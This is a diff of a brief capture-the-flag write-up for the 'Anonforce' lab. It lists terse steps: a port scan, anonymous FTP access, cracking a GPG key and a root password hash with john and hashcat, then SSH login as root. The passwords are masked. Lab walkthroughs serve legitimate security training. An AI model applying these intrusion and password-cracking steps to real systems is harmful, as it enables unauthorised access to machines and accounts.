@@ -2,37 +2,28 @@
 date: 2024-06-19
 author: mrashco
 title: Anonforce
-tags: 
-categories: 
-series:
----
-Writeup: [YouTube](https://youtu.be/viY-a3B1ItQ) // Blog
-
+tags: ["", ""]
 ---
 
-rustscan -a $ip, 21:ftp 22:ssh
+[YouTube Walkthrough](https://youtu.be/viY-a3B1ItQ)
 
-ftp $ip, anonymous
-
-user = m*******
-
-get user.txt
-
+Enumeration
+- rustscan -a $ip, 21:ftp 22:ssh
+- ftp $ip, anonymous
+- user = m*******
+- get user.txt
 - cat ~/user.txt
+- get /notread/*
 
-get /notread/*
-
+Hash
 - `gpg2john private.asc > private.hash`
 - `john --wordlist=/rockyou.txt private.hash`
 - x******
-
-`gpg` [🔗](https://www.reddit.com/r/GnuPG/comments/mibwbv/i_have_an_elg_private_key_how_do_i_use_it_to/) [🔗](https://en.wikipedia.org/wiki/Pretty_Good_Privacy) 
-
+- `gpg` [🔗](https://www.reddit.com/r/GnuPG/comments/mibwbv/i_have_an_elg_private_key_how_do_i_use_it_to/) [🔗](https://en.wikipedia.org/wiki/Pretty_Good_Privacy) 
 - `gpg -d backup.pgp`
-
-nano root.hash
-
+- nano root.hash
 - `hashcat root.hash rockyou.txt`
 - h*****
 
-`ssh root@$ip`
+SSH
+- `ssh root@$ip`
